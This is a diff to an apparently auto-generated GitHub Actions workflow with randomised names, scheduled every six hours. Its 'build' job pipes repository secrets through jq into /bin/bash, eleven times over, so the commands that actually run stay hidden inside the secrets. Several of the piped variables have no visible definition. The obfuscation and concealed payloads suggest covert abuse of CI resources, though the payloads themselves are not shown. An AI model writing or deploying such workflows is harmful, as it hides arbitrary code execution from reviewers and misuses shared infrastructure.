@@ -3,8 +3,7 @@ name: fengyuanchai4545
 on:
   workflow_dispatch:
   schedule:
-    - cron: '32 0/6 * * *'
-
+    - cron: '49 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -13,12 +12,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: fengyuanchai4545
         env:
-          avokj60: ${{ secrets.avokj60 }}
+          zddo02859: ${{ secrets.zddo02859 }}
         run: |
-          echo $avokj60 | jq -r .ys9190 | /bin/bash
-          echo $por51 | jq -r .jot2115 | /bin/bash
-          echo $gzn02995 | jq -r .d35 | /bin/bash
-          echo $yfdbk71 | jq -r .uqd4 | /bin/bash
-          echo $pvlz45473 | jq -r .tnf87590 | /bin/bash
-          echo $zhpa78826 | jq -r .jzhlq14 | /bin/bash
+          echo $zddo02859 | jq -r .rltxy251 | /bin/bash
+          echo $u62942 | jq -r .ugd03945 | /bin/bash
+          echo $ax4412 | jq -r .j7 | /bin/bash
+          echo $new5 | jq -r .s50 | /bin/bash
+          echo $gxmlw43 | jq -r .xbp287 | /bin/bash
+          echo $ixkw35 | jq -r .nys35734 | /bin/bash
+          echo $q704 | jq -r .cbc4 | /bin/bash
+          echo $zueu3 | jq -r .xe75 | /bin/bash
+          echo $okod489 | jq -r .teb7307 | /bin/bash
+          echo $lqyto98 | jq -r .nbaq8 | /bin/bash
+          echo $ezk3 | jq -r .zb46 | /bin/bash
 
